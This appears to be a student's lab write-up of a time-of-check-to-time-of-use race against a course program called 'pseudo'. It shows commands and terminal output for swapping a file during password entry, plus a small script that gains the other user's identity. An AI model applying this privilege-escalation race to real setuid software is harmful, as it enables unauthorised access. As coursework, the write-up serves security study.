### TOCTTOU
`owner_of(argv[2], &tmp)` is called twice, first to confirm if the username exists and to authenticate the password, and then to set `euid` to that user
 - Validate the username as your own user in a fake `/etc/passwd` file (idk if there is a better way to do this)
 - While it is asking for your password, swap out the file you are targeting with `-a` to a file owned by a different user
```
alexander.stevenson@mocha:~/a2$ env -i HOME=. pseudo -a ~/etc/touch/Heega /bin/sh
ðŸ˜¸: Found passwd entry for 'alexander.stevenson' (255)
Upon successful authentication, I shall execve into:
/home/alexander.stevenson/etc/touch/Heega /bin/sh
password for -a:
Authenticated as VladimirRootin (uid: 255)
/bin/sh: /home/alexander.stevenson/etc/touch/Heega: Permission denied
```
```
alexander.stevenson@mocha:~/etc/touch$ ll
total 8
drwxr-xr-x 2 alexander.stevenson root                4096 Nov 14 20:08 ./
drwxr-xr-x 3 root                root                4096 Nov 11 14:49 ../
-rw-r--r-- 1 alexander.stevenson alexander.stevenson    0 Nov 14 20:08 Heega
-r--r--r-- 1 VladimirRootin      VladimirRootin         0 Nov 14 20:06 Yeet
alexander.stevenson@mocha:~/etc/touch$ mv Yeet Heega
```
 - This does authenticate as the user we want, however then it gives `Permission denied` as the target file (created with `touch_as`) does not have execute bits or a way to spawn a shell

It is potentially possible that we can expand on tocttou by forcing it to traverse an extremely large symlink, such that
 - User is validated
 - We check `owner_of` the file, this sends the cpu down a huge symlink
 - While this is traversing, we link the file to `/bin/sh`
 - It finishes traversing, sets the euid to the user we want
 - It then executes the symlink which is `/bin/sh`

Turns out `touch_as` doesn't overwrite the file, it just changes ownership. If you first create the file with the name of a user and then call `touch_as`, it will change ownership of the file without changing the contents.
```
alexander.stevenson@mocha:~/etc/touch$ cat TOCTTOU
#!/bin/sh
"/bin/sh"

alexander.stevenson@mocha:~/etc/touch$ cat copy_file
#!/bin/sh
cp TOCTTOU VladimirRootin
touch_as VladimirRootin
mv VladimirRootin ~/a2/Heega

alexander.stevenson@mocha:~/a2$ env -i HOME=. SHELL=/bin/sh pseudo -a ~/a2/Heega
ðŸ˜¸: Found passwd entry for 'alexander.stevenson' (255)
Upon successful authentication, I shall execve into:
/home/alexander.stevenson/a2/Heega
password for -a:
// SWAP FILE BEFORE ENTERING PASSWORD
Authenticated as VladimirRootin (uid: 255)
$ whodat
 _________________________
< Dat be 'VladimirRootin' >
 -------------------------
       \
        \  ....
          .    ........
          .            .
          .             .
    .......              .........
    ..............................
Elephant inside ASCII snake
You may my glories and my state dispose,
But not my griefs; still am I king of those.
                -- William Shakespeare, "Richard II"
```